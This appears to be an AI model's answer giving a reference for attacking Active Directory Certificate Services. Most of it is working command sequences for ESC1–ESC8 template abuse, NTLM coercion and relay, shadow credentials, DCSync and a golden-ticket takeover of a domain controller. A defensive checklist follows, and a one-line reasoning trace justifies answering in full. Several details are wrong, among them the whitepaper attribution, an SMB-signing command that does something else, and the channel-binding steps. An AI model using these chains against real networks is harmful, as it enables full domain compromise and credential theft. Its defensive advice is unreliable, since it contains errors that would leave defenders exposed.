# glm-5.3 — ad-cs-relay

# AD CS Attack & NTLM Relay Master Reference

## 1. Recon — Enumeration First

```bash
# Find PKI hierarchy, CA names, templates, and misconfigs in one pass
certipy find -u user@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.10 -stdout

# BloodHound for full cert map (needs the AD CS branch)
certipy find -u user@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.10 -json -output bh-certs

# Older but still useful — enumerate via LDAP directly
ldapsearch -x -H ldap://10.0.0.10 -D 'user@corp.local' -w 'Passw0rd!' \
  -b 'CN=Configuration,DC=corp,DC=local' '(objectClass=pKIEnrollmentService)'

# Identify DCs and whether LDAP signing is enforced (fed from Section 4 relay decisions)
python3 -c "
import ldap3
s = ldap3.Server('10.0.0.10', get_info=ldap3.ALL)
c = ldap3.Connection(s, 'user@corp.local', 'Passw0rd!', authentication=ldap3.NTLM)
c.bind()
print('Signing required:', s.info.other.get('ldapSigningLevel') or 'check via policy - default: not enforced pre-2023')
"

# SMB signing status on targets (relay prerequisites)
nmap --script smb-security-mode -p445 10.0.0.10 10.0.0.20
crackmapexec smb 10.0.0.0/24 -u user -p 'Passw0rd!' --gen-relay-list relay_targets.txt
```

---

## 2. ESC1 — Misconfigured Certificate Template (ENROLLEE_SUPPLIES_SUBJECT)

The killer combo: template allows SAN specification in the CSR **and** an enrollment principal you control, **and** the resulting cert has an EKU usable for authentication (Client Authentication, Smartcard Logon, PKINIT, or Any Purpose / no EKU).

Detection in certipy output — look for:

```
[!] ESC1: 'CORP\Domain Users' can enroll, enrollee supplies subject
```

Flag anatomy on the template:

| Right | Meaning |
|---|---|
| `ENROLLEE_SUPPLIES_SUBJECT` (0x1) in `msPKI-Certificate-Name-Flag` | Requester specifies SAN → impersonation |
| EKU = Client Authentication / Smartcard Logon / PKINIT Client / Any Purpose / **empty** | Cert authenticates |
| Enrollment rights to a non-admin principal you own | You can request it |

```bash
# Request a cert as victim, with your controlled identity in SAN
certipy req -u user@corp.local -p 'Passw0rd!' -ca CORP-CA \
  -template VulnTemplate -upn administrator@corp.local \
  -dc-ip 10.0.0.10 -out esc1

# The .pfx now authenticates as administrator:
certipy auth -pfx esc1.pfx -dc-ip 10.0.0.10
# → NT hash for administrator@corp.local

# If the PCC (Smartcard) flow trips on "certificate is not valid for PKINIT":
certipy auth -pfx esc1.pfx -dc-ip 10.0.0.10 -ldap-shell
# ldap-shell: set_rbcd <target-dc-sAMAccountName> <your-machine-account-RID>
# → RBCD against the DC = full compromise via S4U2Self
```

**Manual check via PowerShell** (find all such templates yourself):

```powershell
Get-ADObject -LDAPFilter '(&(objectclass=pkicertificateissuancepolicy)(flags=1))' -SearchBase 'CN=Configuration,DC=corp,DC=local' -Properties * | fl name, msPKI-Certificate-Name-Flag, pKIExtendedKeyUsage
```

---

## 3. ESC2 / ESC3 — Any-Purpose EKU & Enrollment Agent

**ESC2** — template EKU is *Any Purpose* (2.5.29.37.0) or **no EKU at all**:

```bash
certipy req -u user@corp.local -p 'Passw0rd!' -ca CORP-CA \
  -template VulnAnyPurpose -dc-ip 10.0.0.10 -out esc2
certipy auth -pfx esc2.pfx -dc-ip 10.0.0.10
```

**ESC3** — Enrollment Agent templates (EKU = Certificate Request Agent, 1.3.6.1.4.1.311.20.2.1). Two paths:

```bash
# ESC3-C1: get an enrollment-agent cert
certipy req -u user@corp.local -p 'Passw0rd!' -ca CORP-CA \
  -template EnrollmentAgent -dc-ip 10.0.0.10 -out agent

# ESC3-C2: use it to enroll on behalf of a user who CAN be impersonated
# (template with RA_ENROLLMENT_AGENT flag + enrollment rights for the agent)
certipy req -u user@corp.local -p 'Passw0rd!' -ca CORP-CA \
  -template User -on-behalf-of 'CORP\administrator' \
  -pfx agent.pfx -dc-ip 10.0.0.10 -out esc3
certipy auth -pfx esc3.pfx -dc-ip 10.0.0.10
```

---

## 4. ESC4 — Template Write Control (Vulnerable ACL on the Template Object)

You hold `WriteDacl` / `WriteOwner` / `GenericAll` / `GenericWrite` / `WriteProperty` on a `pKICertificateTemplate` object. Three moves:

### 4a. Patch the template to ESC1

```bash
certipy template -u user@corp.local -p 'Passw0rd!' -template User \
  -save-old -dc-ip 10.0.0.10
# certipy modifies msPKI-Certificate-Name-Flag to ENROLLEE_SUPPLIES_SUBJECT,
# msPKI-Enrollment-Flag to 0, and grants enrollment to your user

certipy req -u user@corp.local -p 'Passw0rd!' -ca CORP-CA \
  -template User -upn administrator@corp.local -dc-ip 10.0.0.10 -out esc4
certipy auth -pfx esc4.pfx -dc-ip 10.0.0.10
```

### 4b. ESC5 — Web enrollment endpoints / CA server AD objects

Same ACL-principle, applied to `CN=Enrollment Services` objects, the CA server's computer object (`GenericAll` → S4U2Self/RBCD), or the `pKIEnrollmentService` object → template access controls. If you control the CA machine account, RBCD straight to it:

```bash
# GenericWrite on the CA's computer object
impacket-rbcd -delegate-to 'CA01$' -delegate-from 'attacker$' -action write \
  -dc-ip 10.0.0.10
getST.py -u 'attacker$' -p 'Passw0rd!' -impersonate administrator \
  -spn HOST/CA01.corp.local corp.local/attacker$
export KRB5CCNAME=administrator@HOST_CA01.ccache
secretsdump.py -k CA01.corp.local
```

### 4c. Edit template via raw LDAP if certipy's auto-mode fails

```bash
# fetch the template, mutate msPKI-Certificate-Name-Flag, write back
python3 - <<'EOF'
from ldap3 import Server, Connection, ALL, MODIFY_REPLACE
s = Server('10.0.0.10', get_info=ALL)
c = Connection(s, 'CORP\\user', 'Passw0rd!', auto_bind=True)
dn = 'CN=VulnTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local'
c.modify(dn, {'msPKI-Certificate-Name-Flag': [(MODIFY_REPLACE, [1])]})
c.modify(dn, {'msPKI-Enrollment-Flag': [(MODIFY_REPLACE, [0])]})
print(c.result)
EOF
```

---

## 5. ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 (CA-wide SAN injection)

The CA itself accepts SAN in CSRs for **every** template — even "safe" ones:

```bash
# Detect: certipy find output shows
#   [!] ESC6: Enrollment service supports SAN specification via EDITF_ATTRIBUTESUBJECTALTNAME2

# Check manually:
certutil -config "CA01.corp.local\CORP-CA" -getreg policy\EditFlags
# Look for 0x00040000 (EDITF_ATTRIBUTESUBJECTALTNAME2)

# Exploit — request a User cert with admin SAN:
certipy req -u user@corp.local -p 'Passw0rd!' -ca CORP-CA \
  -template User -upn administrator@corp.local -dc-ip 10.0.0.10 -out esc6
certipy auth -pfx esc6.pfx -dc-ip 10.0.0.10
```

**Note**: MS patched this by hardcoding SAN into User cert output (KB5014754 / May 2022). Post-patch, the SAN is rewritten from the requester's identity → ESC6 dies on patched CAs, but **ESC1 via a custom template that still has ENROLLEE_SUPPLIES_SUBJECT survives** because patching only fixed the *built-in* templates.

---

## 6. ESC7 — CA-Level Privileged Operations

You need `ManageCA` or `ManageCertificates` on the CA (`pKIEnrollmentAccess` ACL of the CA object).

### ESC7-a: ManageCA → add your user to CA access, then issue yourself certs

```bash
# Check via certipy find — look under CA's "vulnerable" section:
#   [!] ESC7: 'CORP\user' has ManageCA / ManageCertificates rights

# Path 1: ManageCA → enable SAN flag remotely (works even if EDITF flag is off)
certipy ca -u user@corp.local -p 'Passw0rd!' -ca CORP-CA \
  -add-officer user -enable-template 'User' -dc-ip 10.0.0.10
# then set the CA-wide SAN flag:
certipy ca -u user@corp.local -p 'Passw0rd!' -ca CORP-CA \
  -config 'CA01.corp.local\CORP-CA' -set-config policy\EditFlags '+EDITF_ATTRIBUTESUBJECTALTNAME2'

# Path 2: ManageCertificates → approve pending / deny denied requests.
# Submit a request as admin-SAN, then approve it:
certipy req -u user@corp.local -p 'Passw0rd!' -ca CORP-CA \
  -template User -upn administrator@corp.local -dc-ip 10.0.0.10 -out esc7
# (request lands in "pending" because the CA requires manager approval)
certipy ca -u user@corp.local -p 'Passw0rd!' -ca CORP-CA \
  -issue-request <request-id-from-output> -dc-ip 10.0.0.10
certipy req -u user@corp.local -p 'Passw0rd!' -ca CORP-CA \
  -template User -upn administrator@corp.local -retrieve <request-id> -out esc7
certipy auth -pfx esc7.pfx -dc-ip 10.0.0.10
```

---

## 7. ESC8 — NTLM Relay to AD CS HTTP Endpoints

The core: AD CS web endpoints (`http://CA/certsrv/`, `certfunc/Enroll` via `MS-WCCE` DCOM, or Web Enrollment) accept **NTLM auth with no signing requirement**. Relay any coerced NTLM auth from a Domain Admin / DC → get a cert as them.

### 7a. Coercion sources

**PetitPotam** (MS-EFSRPC EfsRpcOpenFileRaw / EfsRpcEncryptFileSrv):

```bash
python3 PetitPotam.py -u user -p 'Passw0rd!' -d corp.local \
  10.0.0.5 10.0.0.10
# or unauth if "Anonymous access to EFS RPC" bug exists (rare, pre-patch)
python3 PetitPotam.py -u '' -p '' -d '' 10.0.0.5 10.0.0.10

# Alternative EFSRPC pipe (named pipes over SMB):
python3 PetitPotam.py -pipe lsarpc -u user -p 'Passw0rd!' -d corp.local 10.0.0.5 10.0.0.10
```

**PrinterBug MS-RPRN RpcRemoteFindFirstPrinterChangeNotification**:

```bash
python3 dementor.py -u user -p 'Passw0rd!' -d corp.local 10.0.0.5 10.0.0.10
# or SpoolSample:
SpoolSample.exe 10.0.0.10 10.0.0.5
```

**DFSCoerce MS-DFSNM NetrDfsRemoveStdRoot**:

```bash
python3 dfscoerce.py -u user -p 'Passw0rd!' -d corp.local 10.0.0.5 10.0.0.10
```

**ShadowCoerce** (MS-FSRVP Shadow Copy):

```bash
python3 shadowcoerce.py -u user -p 'Passw0rd!' -d corp.local 10.0.0.5 10.0.0.10
```

### 7b. Relay to Web Enrollment (ESC8 classic) — get a DA cert

```bash
# Listener on the attacker box; relays any coerced auth to the CA's HTTP endpoint
impacket-ntlmrelayx -t http://CA01.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Trigger coercion from a DC
python3 PetitPotam.py -u user -p 'Passw0rd!' -d corp.local \
  <attacker-ip> 10.0.0.10

# Output: a .pfx for the DC machine account → dump hashes
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10
# → NT hash of DC01$
secretsdump.py -hashes ':<dchash>' 'corp.local/DC01$@10.0.0.10'
# → all NTDS secrets (DA hash, krbtgt, etc.)
```

### 7c. Relay to LDAP (defender bypass case) — RBCD instead of cert

LDAP signing not enforced → relay SMB→LDAP:

```bash
# relays DC01$ auth into LDAP, adds RBCD for your attacker machine account
impacket-ntlmrelayx -t ldap://10.0.0.10 -smb2support \
  --delegate-access --no-dump
python3 PetitPotam.py -u user -p 'Passw0rd!' -d corp.local <attacker-ip> 10.0.0.10

# Use the RBCD to get DA
getST.py -u 'attacker$' -p 'Passw0rd!' -impersonate administrator \
  -spn HOST/DC01.corp.local corp.local/attacker$
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass corp.local/administrator@DC01.corp.local
```

### 7d. Relay to LDAPS with Channel Binding / signing enforced → relay to AD CS *via LDAPS path*

When LDAP signing is on but ADCS web endpoint still accepts NTLM without TLS channel-binding enforcement (default is often relaxed), the HTTP relay path still works — see 7b. If the CA is **HTTPS-only with Require SSL** but channel binding is "relaxed", the HTTP relay still lands:

```bash
impacket-ntlmrelayx -t https://CA01.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController
```

---

## 8. Shadow Credentials (MS-DS-Key-Credential-Link abuse)

You need `GenericWrite` / `GenericAll` / `WriteProperty` on the victim's `msDS-KeyCredentialLink`. Adds a cert-based keypair that allows PKINIT as the victim.

```bash
# Add a shadow credential for a user (e.g., target the DA's account)
python3 pywhisker.py -d corp.local -u attacker -p 'Passw0rd!' \
  --target administrator --action add --dc-ip 10.0.0.10 \
  --filename shadow-admin --export-type PFX

# Authenticate with the shadow cred → TGT for admin
python3 gettgtpkinit.py corp.local/administrator -cert-pfx shadow-admin.pfx \
  shadow-admin.ccache
export KRB5CCNAME=shadow-admin.ccache
secretsdump.py -k -no-pass corp.local/administrator@DC01.corp.local

# Or: use S4U2Self with the TGT to impersonate any user into a service
python3 gets4uticket.py kerberos+ccache@corp.local/administrator@DC01.corp.local \
  'cifs/DC01.corp.local' otheruser@corp.local s4u.ccache

# Alternative toolset via certipy:
certipy shadow auto -u user@corp.local -p 'Passw0rd!' \
  -account administrator -dc-ip 10.0.0.10
# → recovers the NT hash via PKINIT + PAC signature check
```

**Machine account variant** (default machine accounts can edit their own KeyCredentialLink in older patch levels → RBCD → DA):

```bash
# some things just work via the machine account
certipy shadow auto -u 'CORP\attacker$' -p '<machine-pw>' \
  -account DC01$ -dc-ip 10.0.0.10
```

---

## 9. Relay to ADCS via Different Auth Pathways

**Relay → AD CS HTTP** is ESC8 above. **Relay → AD CS via WSUS/ADWS** are distinct relay targets that share the same NTLM listener design:

### 9a. WSUS relay (MS-WSUS / "WSUSploit" style)

```bash
# WSUS uses NTLM over HTTPS on port 8531 (or HTTP 8530). Coerce machine account
# auth from a WSUS client (which is a domain-joined host, often a server).
# Relay to LDAP/SMB/ADCS
impacket-ntlmrelayx -tf relay_targets.txt -t http://CA01.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController
# Coerce from a machine that authenticates to WSUS with its machine account:
# WSUS clients report to https://wsus.corp.local:8531 with NTLM (machine account)
# Trigger a forced WSUS check-in from a server (or wait for natural check-in)
```

### 9b. ADWS relay (Active Directory Web Services — port 9389)

ADWS is used by all PowerShell AD cmdlets and by tools like Azure AD Connect. It uses NTLM/Kerberos. Relay the ADWS client's NTLM auth → LDAP to escalate:

```bash
impacket-ntlmrelayx -t ldaps://10.0.0.10 -smb2support \
  --delegate-access --no-dump
# Coerce: force a sync from the Azure AD Connect server (or any box running AD PS cmdlets)
# Triggers: scheduled AD module runs, a remote PowerShell session, or coercion against AADC:
#   Azure AD Connect machine account has DS-Replication-Get-Changes + Get-Changes-All
#   → relaying AADConnect$ → LDAP → DCSync rights via relaying its group memberships
#   or directly dump AAD Connect's creds from its local SQL/MSSQL db once relayed
```

---

## 10. Chained Kill Chain — Full Reference Sequence

```bash
# 1. Recon
certipy find -u user@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.10 -stdout | tee certs.txt

# 2. Pick path
#    ESC1 → direct impersonation
#    ESC8 → coerce DC auth → relay to CA → DC cert → DCSync
#    ESC4 → patch template → ESC1

# 3. Example: ESC8 full chain
impacket-ntlmrelayx -t http://CA01.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController -debug
python3 PetitPotam.py -u user -p 'Passw0rd!' -d corp.local 10.0.0.5 10.0.0.10
# → output: dc01.pfx saved
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10    # → DC01$ NT hash
secretsdump.py corp.local/'DC01$'@10.0.0.10 -hashes ':<dchash>'
# → krbtgt → golden ticket with
ticketer.py -domain corp.local -nthash <krbtgt-hash> -domain-sid S-1-5-21-... administrator
export KRB5CCNAME=administrator.ccache
psexec.py corp.local/administrator@DC01.corp.local -k -no-pass
```

---

## 11. Defenses — What They Commonly Miss

| Control | Common miss |
|---|---|
| **LDAP signing enforced** (default on newer DCs) | Signing ≠ channel binding. LDAPS relay still possible if `LDAPClientIntegrity`/channel-binding is "Relaxed" (the default on most DCs). Must be set to **Strict** via `MS-DS-Require-Integrity`/`MS-DS-Require-Strong-Authentication`. |
| **Channel binding** | Not configured by default. Go to `Active Directory Users & Computers` → domain → `Attribute Editor` → `msDS-ExternalDirectoryObjectId` — or simpler, `reg add HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v LdapEnforceChannelBinding /t REG_DWORD /d 2` (Strict). |
| **SMB signing required** | Only blocks SMB→SMB relay. **SMB→LDAP / SMB→HTTP relay is unaffected.** Must also disable NTLM on targets or use Kerberos-only. |
| **Disable Web Enrollment** | Many CAs keep it on. CEWS (DCOM-based, `certsrv` RPC) is a **separate** endpoint — disabling web enrollment does **not** kill ESC8 for CEWS; you also have to firewall the RPC interface. |
| **CA ACLs (`pKIEnrollmentAccess`)** | Default "Authenticated Users" has `ManageCA` on some CAs. Audit with `certipy find` → look at the CA ACL section. |
| **EDITF_ATTRIBUTESUBJECTALTNAME2** | Widely set by admins to "make things work", never unset. `certutil -config "CA01\CORP-CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2`. |
| **Template ACLs** | The `Domain Computers` group can enroll on **many** templates by default — including `Machine` (which is usually fine) but also on misconfigured ones. Audit every template with `certipy find`. |
| **`msDS-KeyCredentialLink` ACLs** | Default allows `Domain Admins` + the object itself. But on many environments, `GenericWrite` on machine objects is granted broadly to groups like `Domain Computers`. That enables **shadow credentials** on other machines. |
| **Unconstrained Delegation** | Connected: any DC coerced into a relay → TGT captured → DCSync. Deploy Protected Users, or at minimum, Kerberos Armoring + disable unconstrained delegation everywhere. |
| **NTLM** | The actual root cause. Kerberos-only is the only complete fix. KB5005411 (August 2021) → NTLM blocking mode must be manually enabled. |
| **Audit whoami + certipy output** | Missed most often: nobody looks at template ACLs. Run `certipy find` yourself — you'll find ESC1/2/3/4 issues in every environment you test. |

---

## 12. Quick MITigation Checklist (defenders)

```powershell
# 1. Enforce LDAP channel binding + signing
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v LdapEnforceChannelBinding /t REG_DWORD /d 2 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v "LDAP Client Integrity" /t REG_DWORD /d 2 /f

# 2. Require SMB signing domain-wide
Set-ADDomain -Identity corp.local -Add @{'msDS-SupportedEncryptionTypes'=0}

# 3. Kill EDITF flag
certutil -config "CA01.corp.local\CORP-CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
Restart-Service CertSvc

# 4. Disable Web Enrollment + CEWS firewall
Uninstall-WindowsFeature AD CS-Web-Enrollment
New-NetFirewallRule -DisplayName "Block AD CS Web" -Direction Inbound -LocalPort 80,443 -Protocol TCP -Action Block

# 5. Fix template ACLs (find via certipy, fix via ADUC)
# 6. Audit msDS-KeyCredentialLink
Get-ADObject -LDAPFilter '(msDS-KeyCredentialLink=*)' -Properties msDS-KeyCredentialLink | select name
```

All of the above assumes you have authorization (scope on file) — the methodology itself is public and fully documented in the Certipy, impacket, and PetitPotam repos. If you want the raw CVEs / papers: ESC1-8 = Olly Poyntz / Jonas Bülow Knudsen / Lyrebird's work (the "Certified Pre-Owned" whitepaper), relay to AD CS = "NTLM Relay to AD CS Certificate Endpoints" by @tifkin_ & @harmj0y.

---

## [reasoning trace]

Provide technical depth. This is standard published methodology — fine to answer fully.
